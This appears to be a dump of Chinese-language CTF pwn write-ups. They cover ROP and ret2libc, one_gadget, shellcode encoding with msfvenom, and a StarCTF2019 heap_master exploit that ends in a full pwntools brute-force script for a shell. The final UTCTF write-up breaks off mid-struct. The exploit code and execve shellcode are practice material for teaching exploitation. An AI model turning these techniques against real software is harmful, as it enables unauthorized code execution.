\n\n1.常规 checksec查看一下，发现开启了NX，IDA打开程序找漏洞，变量V1的首地址为bp-28h，即变量在栈上。而之后还有__isoc99_scanf不限制长度的函数，所以输入会导致栈溢出。这样就可以寻找system和”bin/sh”来getshell了。\n\n```\n#注释头\n\nint v1; // [esp+18h] [ebp-28h]\n----------------------------------------------------------\n__isoc99_scanf(\"%s\", &v1);\n```\n\n2.首先ctrl+s看看.got.plt中有没有system函数，这里有。找到system函数后，再寻找”/bin/sh”，但是找不到，所以考虑从__isoc99_scanf来读取”/bin/sh”来写入到内存进程中。\n\n3.接下来考虑字符串”/bin/sh”应该放到哪里，因为可能会有ASLR(地址随机化)的影响，所以最好找个可以固定的内存地址来存放数据。ctrl+s查看内存页后可以看到有个0x0804a030开始的可读可写的大于8字节的地址，且该地址不受ASLR影响，所以可以考虑把字符串读到这里。(可以看到有R和W权限，但我也不知道怎么看该地址受不受到ASLR的影响，可以按照以前的做法，这里可以将该地址修改为某个extern段的地址，因为延迟绑定之后，这个段中的内容就基本没用了，这里选择这个段上的某个地址一样可以getshell，我选的是0x0804A050。)\n\n4.既然程序读取用的是__isoc99_scanf，那么参数”%s”也得找到，容易找到位于0x08048629。\n\n5.先编写rop链测试一下：\n\n```\n#注释头\n\nelf = ELF('./pwn1')#rop链必备，用于打开plt和got表来获取函数地址\nscanf_addr = p32(elf.symbols['__isoc99_scanf'])#获取scanf的地址\nformat_s = p32(0x08048629)#这是我们scanf赋予”%s”的地址\nbinsh_addr = p32(0x0804a030)#bin/sh保存的地址\n\nshellcode = ‘A’*0x34 + scanf_addr + format_s + binsh_addr\nprint io.read()\n#读取puts(\"pwn test\")的输出，以便继续执行。io.recv()一样可以，具体用法再做参考\nio.sendline(shellcode1)#第一次scanf输入shellcode1\n```\n\n这里\"A\"*0x34有点不一样，我们可以看到在该函数中声明的局部变量v1距离栈底有0x28，那么main函数的返回地址应该是0x28+0x04=0x2c才对。但是实际上，由于程序最开始的动态链接，是从start开始初始化main函数栈的，所以经过start函数会给main函数栈上压入两个全局偏移量。通过调试也可以看到，输入AAAA,位于FFFDF568,加上0x28应该等于FFFDF590，但是这里却不是ebp，得再加上两个0x04才是ebp的位置。这是因为在程序运行起来的延迟绑定的关系，压入栈的是全局偏移。不过不用管，没啥用，这里直接再加上两个0x04就好了，通过调试也可以调试出来。而且查汇编代码，发现寻址方式是通过esp寻址，也就是[esp+18h]，FFFDF550+0x18=FFFDF568，也就是我们输入的地方。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191551130.jpeg)\n\n6.程序运行到这没什么问题，但是接着运行下去从由于我们覆盖的是main函数的返回地址，让main返回地址返回到scanf中，执行的是return命令。而再次进入到scanf函数中之后，执行：io.sendline(“/bin/sh”)。发现binsh并没有被读入到binsh_addr中，这是因为scanf读取输入时的汇编操作如下：假设为scanf(“%s”,&v1);\n\n```\n#注释头\n\npush v1\npush %s\npush eip\n```\n\n栈的分布如下：\n\n```\n#注释头\n\n栈顶\nscanf返回地址              ---esp +1\nscanf第一个格式化参数%s    ---esp+2\nscanf第二个输入进的参数&v1  ---esp+3\n\n执行时是取esp +2,esp+3\n```\n\n而我们直接return scanf的栈分布如下：\n\n```\n#注释头\n\nscanf 第一个格式化参数%s       ---p32(format_s)   ---esp+1\nscanf第二个输入进的参数&v1     ---p32(binsh_addr)  --esp+2\n执行时是取esp+2,esp+3\n```\n\nscanf在执行过程中，由于我们没有将scanf的返回地址压入栈中，所以第一个读取的是esp+2，将我们需要输入的binsh的地址当作了格式化参数%s来读取，发生错误。之后scanf也没办法正常返回\n\n8.所以我们用main函数的return来调用scanf时，需要给栈布置一个scanf的返回地址，否则scanf执行过程中会读取参数发生错误，不能正常读取和返回。\n\n9.那么第一次的shellcode顺序应该是‘A’*0x34 + scanf_addr + scanf_returnaddr + format_s + binsh_addr。\n\n```\n#注释头\n\nshellcode1 = 'A'*0x34\t#padding\nshellcode1 += scanf_addr # 调用scanf以从STDIN读取\"/bin/sh\"字符串\nshellcode1 += scanf_retn_addr # scanf返回地址\nshellcode1 += format_s # scanf参数 \nshellcode1 += binsh_addr # \"/bin/sh\"字符串所在地址\n```\n\n之后大多有两种解决方案：\n\n▲第一种：将scanf返回到main，再次执行栈溢出：\n\n也就是将scanf的返回地址设置为main函数的地址，scanf出来之后，回到mian中之后，第二次的shellcode应该是’A’*0x2c +system_addr + system_ret_addr + binsh_addr。这里的system_addr和上述的scanf中是一样的，都是为了防止函数读取参数发生错误从而无法正常执行。但是这里的system_ret_addr可以随便填，因为我们并不需要返回system，进入到system之后执行binsh就能getshell了。而’A’*2c是因为栈的状态发生了改变，所以需要重新计算一下。因为再次进入main函数构造出来的Main函数栈应该是0x40，而不是之前0x48这么大了，没有经过start函数初始化main函数栈，不存在压入的全局偏移，系统只是将这次的main函数当作一个普通的函数来构造栈。\n\n所以这一次我们输入的内容距离栈底就确实只有0x28这么远了，那么计算一下0x28+0x04=0x2c，所以这一次的padding就是0x2c。\n\n```\n#注释头\n\nshellcode2 = 'B'*0x2c\t#padding\nshellcode2 += system_addr #跳转到system函数以执行system(\"/bin/sh\")\nshellcode2 += main_addr # system函数返回地址，随便填\nshellcode2 += binsh_addr #system函数的参数\n```\n\n \n\n▲第二种：将scanf的返回地址拿来做文章，通过rop将esp直接下拉两个0x04到达我们输入的system，然后在从之后的地方读取binsh字符串，一次payload直接搞定：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191551712.png)\n\n通过汇编代码可以看到，调用scanf时的栈状态应该跟下图一样：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191551658.png)\n\n所以我们scanf函数返回时esp应该还是指向的format参数地址才对，那么为了将esp下拉两个0x04，到达输入的system函数地址，就需要两个Pop操作，这里通过ROPgadget可以查出来，或者直接从init什么的初始化段中找万能gadget，同样存在多个Pop操作。那么这样的化就只有一次payload，所以总的payload就应该是：\n\n```\n#注释头\n\nshellcode1 = 'A'*0x34 #padding\nshellcode1 += scanf_addr # 调用scanf以从STDIN读取\"/bin/sh\"字符串\nshellcode1 += pop_pop_ret_addr# scanf返回后到两个Pop操作处\nshellcode1 += format_s # scanf参数\nshellcode1 += binsh_addr #作为scanf的参数读取binsh字符串\nshellcode1 += system_addr # \"/bin/sh\"字符串所在地址\nshellcode1 += binsh_addr #作为system的参数getshell\n```\n\n▲这里再给出第三种方案，也比较容易理解\n\n这个方案是基于第一种的，覆盖scanf返回地址为start函数，这样main函数栈又重新初始化，相当重新执行一次程序，那么第二次的shellcode的padding字符个数还是0x34个A，之后就常规覆盖eip跳转system函数getshell了。但是这里直接写start函数的首地址会出错，因为这里的start首地址为0x08048420，末尾为20，转化成字符串就是空格。而读入我们输入的又是scanf，scanf不支持空格录入，所以遇到空格就会发生截断，导致读不进去。而这里又是因为大端序，如果发生0x08048420，那么先发送的字符是0x20，也就是空格，那么就直接截断，之后所有数据都读不了了。所以这里如果需要传入start函数，则将start函数下拉两个字节，传入0x08048422。看汇编代码：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191551445.jpeg)\n\nstart函数体的第一条汇编指令是xor ebp,ebp。异或操作，就是将ebp清理好初始化而已，啥用也没有，所以可以直接跳过，到pop esi就行。具体代码就是将第一种方案的种第一段shellcode的main_addr改成start_addr+0x02，然后偏移都是0x34就行。\n\n \n\n \n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n\nhttps://www.cnblogs.com/sweetbaby/p/14148625.html\n\n \n","tags":["ROP"],"categories":["PWN","ROP0x3"]},{"title":"Shellcode汇总","url":"/2021/08/14/ShellCode汇总/","content":"\n# 一、shellcode的查找和获取：\n\n- 地址：http://shell-storm.org/shellcode/\n\n- 获取方式：可以通过linux/x86/sh/bash/execve/shellcode等等关键词来查找\n\n \n\n# 二、shellcode的编码：\n\n示例：\n\n```\n#注释头\n\npython -c 'import sys; sys.stdout.write(\"\\x31\\xc9\\xf7\\xe1\\xb0\\x0b\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80\")' | msfvenom -p - -e x86/alpha_mixed -a linux -f raw -a x86 --platform linux BufferRegister=EAX -o payload\n```\n\n- ’import sys; sys.stdout.write(“shellcode”)’：这是导入包之后写入编码的shellcode。\n\n- 由于msfvenom只能从stdin中读取，所以使用Linux管道符”|”来使得shellcode作为python程序的输出。\n\n- 此外配置编码器为x86/alpha_mixed，配置目标平台架构等信息，输出到文件名为payload的文件中。\n\n- Shellcode的执行条件一般都是call Register，这里的BufferRegister设置是因为通过指令call eax调用shellcode,所以配置BufferRegister=EAX。最后即可在payload中看到对应的被编码后的代码。\n\n \n\n# 三、shellcode的两段执行：\n\n- 需要泄露RWX段的地址，读取泄露地址：\n\n- 需要跳转jmp命令或者是return/call，但是return会pop eip，call会push eip，都会修改掉栈中的内容。如果shellcode的两段执行计算偏移地址的话，可能需要将这两个内容也计算进入。但是jmp就不会需要，是直接无条件跳转，所以大多时候选择jmp比较好。\n\n \n\n \n","tags":["Fmstr"],"categories":["PWN","Shellcode0x2"]},{"title":"Security Fest CTF 2016-tvstation","url":"/2021/08/14/Security Fest CTF 2016-tvstation/","content":"\n \n\n1.题目给了libc库，需要查看一下版本，直接拖到Linux中运行一下./libc.so.6_x64，就可以知道是libc2.24的，但Linux中的libc没有该版本，所以用pwndocker来连接运行。具体怎么用看下方链接，同样docker也自行学习。\n\nhttps://github.com/skysider/pwndocker\n\n如果需要使用到这个libc调试，则在python中设置下列代码：\n\n```\n#注释头\n\nio = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './tvstation'], env={\"LD_PRELOAD\":\"./libc.so.6_x64\"})\n```\n\n2.然后开始分析文件，常规checksec，开了NX，IDA打开文件找漏洞，发现输入4进入debug函数后可以泄露system的内存地址：\n\n```\n#注释头\n\nv0 = dlsym((void *)0xFFFFFFFFFFFFFFFFLL, \"system\");\nsprintf(fmsg, info, v0);\nv1 = strlen(fmsg);\nwrite(1, fmsg, v1);\n```\n\ndlsym()的函数原型是\n\nvoid* dlsym(void* handle,const char* symbol);\n\n该函数在<dlfcn.h>文件中,handle是由dlopen打开动态链接库后返回的指针，symbol就是要求获取的函数的名称，函数返回值是void*,指向函数的地址，供调用使用。write函数的fd是1，所以就相当于直接打印在屏幕上，这里涉及linux系统调用号内容，可以直接查linux下的目录/usr/include/asm/中的unistd_32.h和unistd_64.h。\n\n这段代码的意思就是把指向system函数的指针返回给v0,然后将v0格式化输出给fmsg，之后将fmsg原封不动打印在屏幕上，第一次看到猜不出来可以直接运行该文件试试呗。之后会进入一个debug_func()，这里存在栈溢出：\n\n```\n#注释头\n\n__int64 buf; // [rsp+0h] [rbp-20h]\nreturn read(0, &buf, 0xC8uLL);\n```\n\n3.现在有了system的内存地址和栈溢出，就差/bin/sh字符串了。这里用IDA打开题目给的libc文件，可以找到bin/sh字符串的地址binsh_libc_addr和system的地址system_libc_addr。所以这就相当于有system的被libc加载的真实地址，那么system的真实system_addr减去system_libc_addr就可以得到Libc被加载进来的首地址libc_start_addr。即现掌握地址：libc_start_addr，system_addr，system_libc_addr，binsh_libc_addr通过计算可得：binsh_addr = system_addr - system_libc_addr + binsh_libc_addr。这不是栈溢出有了，system函数和binsh字符串的真实地址有了，这不直接getshell就完事了吗，闹啥呢，这破题目，没点技术含量。\n\n4.但程序还是得走走，64位程序，所以需要使用ROPgadget表来查找pop rdi ; ret这个代码所在的地址，也是在Libc中查找到，然后加上libc_start_addr就可得到pop_rdi_addr。\n\n5.之后计算偏移量，远程调试下进行，payload依次为padding + pop_rdi_addr + binsh_addr + system_addr。\n\n6.再考虑输入情况：先在Linux下运行，所以能看到需要在接收到”: ”时可以输入4，然后进入到打印system_addr，打印完之后，需要从打印出来的system地址读取进我们设定的system_addr。\n\n7.由于打印格式是@x0x7ffffff，所以在recvuntil”@x”，之后开始获取打印的system_addr:system_addr = int(io.recv(12), 16)，以十六进制总共读取12位\n\n8.读取完成system_addr后就可以开始输入payload，之后就可以interactive()。\n\n \n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["ROP"],"categories":["PWN","ROP0x3"]},{"title":"TJCTF 2016-oneshot","url":"/2021/08/14/TJCTF 2016-oneshot/","content":"\n \n\n1.常规checksec，只开了NX，然后IDA打开找漏洞。发现找不到什么漏洞，但是有个很奇怪的地方\n\n```\n#注释头\n\n__int64 (__fastcall *v4)(const char *); // [rsp+8h] [rbp-8h]\n---------------------------------------------------------------------------\n__isoc99_scanf(\"%ld\", &v4);\n-------------------------------------------------------------------------\nreturn v4(\"Good luck!\");\n```\n\n查看反汇编代码后发现会有这么一串代码，v4是我们输入的东西，却被以函数形式调用。在汇编窗口中看下，发现call puts函数之后的代码形式是这样的。\n\n```\n#注释头\n\nvar_8 = qword ptr -8\n--------------------------------------------------------\nmov  rax, [rbp+var_8]\nmov  rdx, rax\nmov  eax, 0\ncall rdx\n```\n\n也就是把我们输入的保存在var_8里的内容，给了rax,rax又给了rdx，之后call rdx。也就是我们输入的东西最后会被当初代码指令来执行。\n\n2.程序不存在栈溢出，输入只能是4个字节，已经规定好了。%ld代表long int，四个字节，程序又没有一次getshell的后门函数，所以就只能靠这4个字节来getshell。\n\n3.这里考虑使用one gadget RCE来一步getshell，首先在Linux下查找一下题目给的libc中有没有onegadget:\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191550001.jpeg)\n\n4.这样就可以通过一次跳转来getshell，但是第一条有限制条件，由于汇编代码中在call rdx之前有mov eax,0;即rax就等于0。(eax在64位程序下就是rax的低32位)或者先调试看看能不能满足条件，经过调试发现执行到call rdx时rax = 0，也满足要求，那么就尝试写payload。\n\n5.本地中首先需要连接到指定的库文件中，可以先在linux中ldd libc库文件来看题目给的库文件是什么版本，之后修改这段代码让process能够连接到指定版本的libc文件。(利用pwndocker，或者自己下个对应版本的ubuntu—docker，然后安装python之类的)\n\nio = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './tvstation'], env={\"LD_PRELOAD\":\"./libc.so.6_x64\"})\n\n6.由于不知道onegadget被libc加载进入之后是在什么地址，所以现在还需要泄露一个地址，刚好程序中有两个isoc99_scanf，第一个可以用来输入某个函数.got表中onegadget的地址，然后程序会打印出来该函数真实地址，对应代码为：\n\n```\n#注释头\n\n__isoc99_scanf(\"%ld\", &v4);\nprintf(\"Value: 0x%016lx\\n\", *(_QWORD *)v4);\n```\n\n但注意输入的格式。由于输入格式为__isoc99_scanf(\"%ld\", &v4)中的ld，也就是十进制有符号长整型，(l=long型，d=Decimal也就是十进制)所以我们需要将该地址转化为十进制数然后输入，因为scanf格式规定了，之后打印的格式是%016lx，其中x代表Hexadecimal，也就是16进制，16代表总共输出16位，0代表不足16位则高位补零。(如果不知道可以拿visualstudio测试一下就可以)\n\n7.所以第一次输入应该为某个函数地址对应的十进制，这里选取setbuf函数，因为setbuf函数刚好在.got.plt表中，同时也从外部引用，在extern也有，十六进制地址为：0x600ae0(这里选用puts,printf,甚至__libc_start_main也行，只要满足在.got.plt表中和extern表中)也就是6294240，即io.sendline(“6294240”)。这样就可以打印出setbuf函数被加载进内存的地址，之后获取这个地址，先接收io.recvuntil(\"Value: \")，使得接下来打印的是setbuf的内存地址，之后使用\n\nsetbuf_memory_addr = int(io.recv()[:18], 16)\n\n表示总共接收18个字符，之后以16进制形式转化位int，10进制形式。这里总共应该会打印18个字符，16+0x，也就是18个。\n\n8.之后计算偏移量，得到one_gadget_rce在内存中的地址即可：注意要转化为str字串形式发送\n\nio.sendline(str(setbuf_memory_addr - (setbuf_addr_libc - one_gadget_rce_libc)))\n\n9.最后io.interactive()即可getshell。\n\n \n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["ROP"],"categories":["PWN","ROP0x3"]},{"title":"StarCTF2019_heap_master","url":"/2021/08/14/StarCTF2019_heap_master/","content":"\n这道题学到了很多，特此记录一下。\n\n# 1.常规checksec一下，保护全开。\n\n# 2.函数解析：\n\n比较常规的菜单题，这里的add是正常，但是程序最开始mmap一块0x10000大小的chunk，之后的edit和delete都是针对这个最开始mmap出来的chunk。\n\n(1)edit函数：输入偏移，针对m_chunk_addr对应偏移修改。比如m_chunk_addr=0x100，偏移为0x10，修改内容为'M'那么修改内容为*(0x100+0x10) = 'M'，即*(m_chunk_addr+offset) = change_cont。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs1-2.png)\n\n(2)delete函数：同样输入偏移针对m_chunk_addr对应偏移free，由于没有指针的相关操作，所以这里存在UAF。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs2-2.png)\n\n# 3.漏洞解析：\n\n(1)由于mmap的数据可以任意伪造和释放，那么我们可以利用这个释放任意大小chunk，在没有办法泄露地址的情况下，我们可以选择进行爆破global_max_fast，利用unsortedbin attack在global_max_fast上写下main_arena地址，使得fastbinY数组可以越界写。\n\n(2)之后再利用释放任意大小的chunk，从main_arena中fastbinY数组越界往后写，修改_IO_2_1_stout结构体的_IO_write_base、_IO_write_ptr、_IO_read_end、_IO_write_end为mmap中放入unsortedbin的堆地址，从而泄露出main_arena地址得到地址。\n\n(3)再利用fastbin的特性，修改fastbinY数组上的chunk的fd为system，申请对应大小的fastbin回来之后，其fd就留在fastbinY数组上，这样如果fastbinY对应的那个索引chunk本身就在free_hook上，那么就可以修改free_hook为system了。这个同样通过fastbinY数组越界写来实现。\n\n(4)最后释放一个/bin/sh堆块即可getshell。\n\n# 4.exp编写与调试：\n\n(1)首先是菜单函数：\n\n```python\n#注释头\n\ndef dbg():\n    gdb.attach(io)\n    pause()\n    \n\ndef add(size):\n    io.sendlineafter(\">> \", \"1\")\n    sleep(0.01)\n    io.sendlineafter(\"size: \", str(size))\n    sleep(0.01)\n\ndef edit(offset, cont):\n    io.sendlineafter(\">> \", \"2\")\n    sleep(0.01)\n    io.sendlineafter(\"offset: \", str(offset))\n    sleep(0.01)\n    io.sendlineafter(\"size: \", str(len(cont)))\n    sleep(0.01)\n    io.sendafter(\"content: \", cont)\n    sleep(0.01)\n\ndef m_edit(offset, cont):\n    io.sendline(\"2\")\n    sleep(0.01)\n    io.sendline(str(offset))\n    sleep(0.01)\n    io.sendline(str(len(cont)))\n    sleep(0.01)\n    io.send(cont)\n    sleep(0.01)\n\ndef delete(offset):\n    io.sendlineafter(\">> \", \"3\")\n    sleep(0.01)\n    io.sendlineafter(\"offset: \", str(offset))\n    sleep(0.01)\n\ndef m_delete(offset):\n    io.sendline(\"3\")\n    sleep(0.01)\n    io.sendline(str(offset))\n    sleep(0.01)\n```\n\n这里切分m_delete和m_edit的原因是因为在后面第一次修改_IO_write_base之后输出的东西可能就会发生一些变化，不太好接着判断。\n\n(2)修改global_max_fast：\n\n```python\n#注释头\n\nedit(0,p64(0x0)+p64(0x91)+\n    '0'*0x80+\n    p64(0x0)+p64(0x21)+\n    '1'*0x10+\n    p64(0x0)+p64(0x21))\ndelete(0x10)\nguess = 0x9000\nedit(0x18, p16((guess + libc.sym['global_max_fast'] - 0x10) & 0xffff))\nadd(0x80)\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-11_14-40-07.png)\n\n(3)fastbinY数组越界写，泄露得到地址：\n\n```python\n#注释头\n\nfastbinsY = guess + libc.sym['main_arena'] + 8\n_IO_read_end = guess + libc.sym['_IO_2_1_stdout_'] + 0x10\n_IO_write_base = guess + libc.sym['_IO_2_1_stdout_'] + 0x20\n_IO_write_ptr = guess + libc.sym['_IO_2_1_stdout_'] + 0x28\n_IO_write_end = guess + libc.sym['_IO_2_1_stdout_'] + 0x30\n\n\n\n# overwrite _IO_2_1_stdout_._IO_write_base\nidx = (_IO_write_base - fastbinsY) / 8\nsize = idx * 0x10 + 0x20\nm_edit(0x10 + 0x8, p64(size+1))\nm_edit(0x10 + size, p64(0x0)+p64(0x21))\nm_delete(0x10 + 0x10)\n\n\n# overwrite _IO_2_1_stdout_._IO_write_ptr\nidx = (_IO_write_ptr - fastbinsY) / 8\nsize = idx * 0x10 + 0x20\nm_edit(0x10 + 0x8 + 0x10, p64(size+1))\nm_edit(0x10 + size + 0x10, p64(0x0)+p64(0x21))\nm_delete(0x10 + 0x10 + 0x10)\n\n\n# overwrite _IO_2_1_stdout_._IO_write_end\nidx = (_IO_write_end - fastbinsY) / 8\nsize = idx * 0x10 + 0x20\nm_edit(0x10 + 0x8 + 0x10, p64(size+1))\nm_edit(0x10 + size + 0x10, p64(0x0)+p64(0x21))\nm_delete(0x10 + 0x10 + 0x10)\n\n\n# overwrite _IO_2_1_stdout_._IO_read_end\nidx = (_IO_read_end - fastbinsY) / 8\nsize = idx * 0x10 + 0x20\nm_edit(0x10 + 0x8, p64(size+1))\nm_edit(0x10 + size, p64(0x0)+p64(0x21))\nm_delete(0x10 + 0x10)\n\n\nlibc_base= u64(io.recvuntil(\"\\x7f\")[-6: ] + '\\0\\0') - libc.sym['main_arena'] - 88\nlog.info(\"libc_base:0x%x\"%libc_base)\n__free_hook = libc_base + libc.sym['__free_hook'] \nfastbinsY = libc_base + libc.sym['main_arena'] + 8 \nsystem_addr = libc_base + libc.sym['system']\n```\n\nmmap为0x4a0fe000\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-11_14-51-03-1.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-11_14-51-32.png)\n\n四个均修改过了，这种情况下flag不修改也是可以泄露的。\n\n▲其实这个只写write_base和read_end也可以，只不过会发送特别多的数据过来，打远程的时候很不好打。需要注意的是read_end得最后写。\n\n(4)越界释放chunk到_free_hook，然后修改其fd为system，再申请回来就可以将_free_hook改为system。\n\n```python\n#注释头\n\n# fake fastbin fd to system\nidx = (__free_hook - fastbinsY) / 8\nsize = idx * 0x10 + 0x20\nlog.info(\"size:0x%x\"%size)\nedit(0x10 + 8, p64(size+1))\nedit(0x10 + size, p64(0x0)+p64(0x21))\ndelete(0x10 + 0x10)\nedit(0x20, p64(system_addr))\nadd(size - 0x10)\n```\n\n没有申请回来之前，free_hook上是堆地址，其FD为system\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs1-3.png)\n\n申请回来之后，FD被写进free_hook，这是fastbin机制造成的。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs2-3.png)\n\n(5)创建/bin/sh堆块，释放即可getshell：\n\n```python\n#注释头\n\nedit(0x200, p64(0x0)+p64(0x21)+\"/bin/sh\\0\")\ndelete(0x200 + 0x10)\nio.interactive()\n```\n\n# 5.总的爆破EXP：\n\n```python\n#注释头\n\n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nfrom pwn import *\nfrom time import sleep\nimport os\ncontext.binary = \"./heap_master\"\nlibc = ELF(context.binary.libc.path)\n\n\ndef dbg():\n    gdb.attach(io)\n    pause()\n    \n\ndef add(size):\n    io.sendlineafter(\">> \", \"1\")\n    sleep(0.01)\n    io.sendlineafter(\"size: \", str(size))\n    sleep(0.01)\n\ndef edit(offset, cont):\n    io.sendlineafter(\">> \", \"2\")\n    sleep(0.01)\n    io.sendlineafter(\"offset: \", str(offset))\n    sleep(0.01)\n    io.sendlineafter(\"size: \", str(len(cont)))\n    sleep(0.01)\n    io.sendafter(\"content: \", cont)\n    sleep(0.01)\n\ndef m_edit(offset, cont):\n    io.sendline(\"2\")\n    sleep(0.01)\n    io.sendline(str(offset))\n    sleep(0.01)\n    io.sendline(str(len(cont)))\n    sleep(0.01)\n    io.send(cont)\n    sleep(0.01)\n\ndef delete(offset):\n    io.sendlineafter(\">> \", \"3\")\n    sleep(0.01)\n    io.sendlineafter(\"offset: \", str(offset))\n    sleep(0.01)\n\ndef m_delete(offset):\n    io.sendline(\"3\")\n    sleep(0.01)\n    io.sendline(str(offset))\n    sleep(0.01)\n\ndef pwn():\n    global io\n    edit(0,p64(0x0)+p64(0x91)+\n        '0'*0x80+\n        p64(0x0)+p64(0x21)+\n        '1'*0x10+\n        p64(0x0)+p64(0x21))\n    delete(0x10)\n    guess = 0x9000\n    edit(0x18, p16((guess + libc.sym['global_max_fast'] - 0x10)&0xffff))\n    add(0x80)\n\n\n    fastbinsY = guess + libc.sym['main_arena'] + 8\n    _IO_read_end = guess + libc.sym['_IO_2_1_stdout_'] + 0x10\n    _IO_write_base = guess + libc.sym['_IO_2_1_stdout_'] + 0x20\n    _IO_write_ptr = guess + libc.sym['_IO_2_1_stdout_'] + 0x28\n    _IO_write_end = guess + libc.sym['_IO_2_1_stdout_'] + 0x30\n    __free_hook = guess + libc.sym['__free_hook']\n    _IO_list_all = guess + libc.sym['_IO_list_all']\n\n    # overwrite _IO_2_1_stdout_._IO_write_base\n    idx = (_IO_write_base - fastbinsY) / 8\n    size = idx * 0x10 + 0x20\n    m_edit(0x10 + 0x8, p64(size+1))\n    m_edit(0x10 + size, p64(0x0)+p64(0x21))\n    m_delete(0x10 + 0x10)\n\n\n    # overwrite _IO_2_1_stdout_._IO_write_ptr\n    idx = (_IO_write_ptr - fastbinsY) / 8\n    size = idx * 0x10 + 0x20\n    m_edit(0x10 + 0x8 + 0x10, p64(size+1))\n    m_edit(0x10 + size + 0x10, p64(0x0)+p64(0x21))\n    m_delete(0x10 + 0x10 + 0x10)\n\n    # overwrite _IO_2_1_stdout_._IO_write_end\n    idx = (_IO_write_end - fastbinsY) / 8\n    size = idx * 0x10 + 0x20\n    m_edit(0x10 + 0x8 + 0x10, p64(size+1))\n    m_edit(0x10 + size + 0x10, p64(0x0)+p64(0x21))\n    m_delete(0x10 + 0x10 + 0x10)\n\n\n    # overwrite _IO_2_1_stdout_._IO_read_end\n    idx = (_IO_read_end - fastbinsY) / 8\n    size = idx * 0x10 + 0x20\n    m_edit(0x10 + 0x8, p64(size+1))\n    m_edit(0x10 + size, p64(0x0)+p64(0x21))\n    m_delete(0x10 + 0x10)\n\n    libc_base= u64(io.recvuntil(\"\\x7f\")[-6: ] + '\\0\\0') - libc.sym['main_arena'] - 88\n    log.info(\"libc_base:0x%x\"%libc_base)\n    __free_hook = libc_base + libc.sym['__free_hook']\n    fastbinsY = libc_base + libc.sym['main_arena'] + 8\n    system_addr = libc_base + libc.sym['system']\n\n\n    # fake fastbin fd to system\n    idx = (__free_hook - fastbinsY) / 8\n    size = idx * 0x10 + 0x20\n    log.info(\"size:0x%x\"%size)\n    edit(0x10 + 8, p64(size+1))\n    edit(0x10 + size, p64(0x0)+p64(0x21))\n    delete(0x10 + 0x10)\n    edit(0x20, p64(system_addr))\n    #dbg()\n    add(size - 0x10)\n    #pause()\n\n    edit(0x200, p64(0x0)+p64(0x21)+\"/bin/sh\\0\")\n    delete(0x200 + 0x10)\n\n    io.interactive()\n\n\n\ni = 0\nwhile True:\n    i += 1\n    print i\n    io = process(\"./heap_master\")\n    try:\n        pwn()\n        io.recv(timeout = 1) \n        #要么崩溃要么爆破成功，若崩溃io会关闭，io.recv()会触发   EOFError\n    except EOFError:\n        io.close()\n        continue\n    else:\n        # sleep(0.1)\n        # io.sendline('/bin/sh\\x00')\n        # sleep(0.1)\n        # io.interactive() #没有EOFError的话就是爆破成功，可以开shell\n        break\n```\n\n# 6.总结：\n\n(1)unsortedbin attack：修改bk任意写main_arena，这里bk通常可以进行部分写来爆破，也常常用来修改global_max_fast，使得fastbinY越界写。\n\n(2)FSOP的利用中，不一定非得修改flag，修改_IO_write_base、_IO_write_ptr、_IO_read_end、_IO_write_end也可以，其中需要满足_IO_read_end等于_IO_write_base来起到flag的作用绕过检查。\n\n(3)fastbinY数组的越界申请，修改其fd可实现任意写，这点和利用fastbinY数组中chunk大小在main_arena中留下0x20~0x80的数据异曲同工。","tags":["Heap-Skill"],"categories":["PWN","pwn堆-刷题技巧"]},{"title":"UTCTF赛后复现","url":"/2021/08/14/UTCTF赛后复现/","content":"\n这次比赛做了两道题之后就没怎么看了，忙其他的去了。这里主要复现一下另一道题，monke。做这道题的时候估计脑子抽风了，居然没看还有一个隐藏选项在IDA中明明白白地显示着，自己居然没发现，导致啥漏洞都找不出来。\n\n一、MONKE复现：\n\n1.常规IDA，checksec一下，只开了NX。漏洞点在Free模块和隐藏选项：\n\nFree模块\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191457777.png)\n\n隐藏选项：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191457778.png)\n\n可以看到当free的时候，会对can_eat这个全局变量进行判断：\n\n```\n//注释头\n\n\ncan_eat默认为1\n------------------------------------------------------------------------------\nif ( can_eat )\n    inventory[edit_idx] = 0LL;\n```\n\n如果为1，则将指针置零，否则就不置零。这样就会造成管理banana的inventory[idx]指针悬空，再加上选项2可以rename修改内容，直接造成UAF漏洞。同时，由于这里是通过结构体inventory来管理banana，结构体如下：\n\n```\n//注释头\n\n00000000 inventory struc ; (sizeof=0x10, mappedto_4)\n00000000 banana dq ?\n00000008 name_size dq ?\n00000010 inventory 